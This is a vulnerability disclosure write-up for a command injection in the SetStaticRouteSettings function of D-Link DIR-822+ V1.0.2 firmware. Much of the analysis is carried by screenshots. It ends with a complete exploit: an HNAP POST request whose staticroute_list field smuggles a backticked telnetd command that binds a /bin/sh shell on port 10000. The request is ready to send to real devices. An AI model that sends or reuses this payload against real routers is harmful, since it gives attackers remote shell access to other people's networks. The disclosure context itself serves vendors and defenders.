# DIR-822+ Command Injection
###Discoverer
杨益/霍兴鹏

## Overview

D-Link DIR-822+ V1.0.2 was found to contain a command injection in `SetStaticRouteSettings` function.  allows remote attackers to execute arbitrary commands via shell

![image-20231221212125407](https://github.com/funny-mud-peee/IoT-vuls/blob/main/dir822%2B/1/img/image-20231221212125407.png)

![image-20231221212129179](https://github.com/funny-mud-peee/IoT-vuls/blob/main/dir822%2B/1/img/image-20231221212129179.png)

## Vulnerability details

![image-20231221214813987](https://github.com/funny-mud-peee/IoT-vuls/blob/main/dir822%2B/1/img/image-20231221214813987.png)

Use ’，‘ to segment data from the `staticroute list` and pass in the `sub_437028` function

![image-20231221214821593](https://github.com/funny-mud-peee/IoT-vuls/blob/main/dir822%2B/1/img/image-20231221214821593.png)

This part of the data was directly passed in `FCGI_popen` without any filtering

![image-20231221215626633](https://github.com/funny-mud-peee/IoT-vuls/blob/main/dir822%2B/1/img/image-20231221215626633.png)

`FCGI_popen`Called `popen` to create a pipeline to execute the command.

![image-20231221220509945](https://github.com/funny-mud-peee/IoT-vuls/blob/main/dir822%2B/1/img/image-20231221220509945.png)

Based on the cause of the vulnerability, we only need to use commas to separate three addresses and the command to be executed. The final constructed EXP is as follows:

## EXP

```
POST /HNAP1/ HTTP/1.1
Host: 192.168.0.1
Content-Length: 50
Accept: application/json
HNAP_AUTH: 4EDFBBC3845CEF88B0CC7B5A5B9419EB 1703160655517
SOAPACTION: "http://purenetworks.com/HNAP1/SetStaticRouteSettings"
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0
Content-Type: application/json
Origin: http://192.168.0.1
Referer: http://192.168.0.1/Staticroute.html
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6
Cookie: uid=VtVTeClk; PrivateKey=990D6EA08F8E8583354AD9D96CB35450; timeout=56
Connection: close

{"SetStaticRouteSettings":{"staticroute_list":"192.168.1.1,255.255.255.255,192.168.0.1,`telnetd -l /bin/sh -p 10000 -b 0.0.0.0`"}}
```

![image-20231221220640871](https://github.com/funny-mud-peee/IoT-vuls/blob/main/dir822%2B/1/img/image-20231221220640871.png)

![image-20231221220705779](https://github.com/funny-mud-peee/IoT-vuls/blob/main/dir822%2B/1/img/image-20231221220705779.png)
